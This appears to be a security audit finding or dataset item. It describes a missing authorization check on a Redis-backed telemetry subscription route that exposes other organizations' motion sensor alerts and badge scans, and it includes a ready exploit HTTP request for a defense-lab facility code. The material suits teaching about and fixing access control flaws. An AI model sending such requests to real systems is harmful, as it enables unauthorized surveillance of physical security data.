diagnosis: The telemetry streaming route accepts facility_code as a query parameter and executes psubscribe(f"telemetry:{facility_code}:*") against Redis. It does not check if current_user is authorized for facility_code, allowing an authenticated contractor to monitor raw physical security telemetry, motion sensor alerts, and badge scans from facilities belonging to other organizations.
exploit_request:
GET /streams/telemetry/subscribe?facility_code=FAC_DEFENSE_LAB_02 HTTP/1.1
Host: iot.facilitystream.io
Authorization: Bearer <contractor_token>
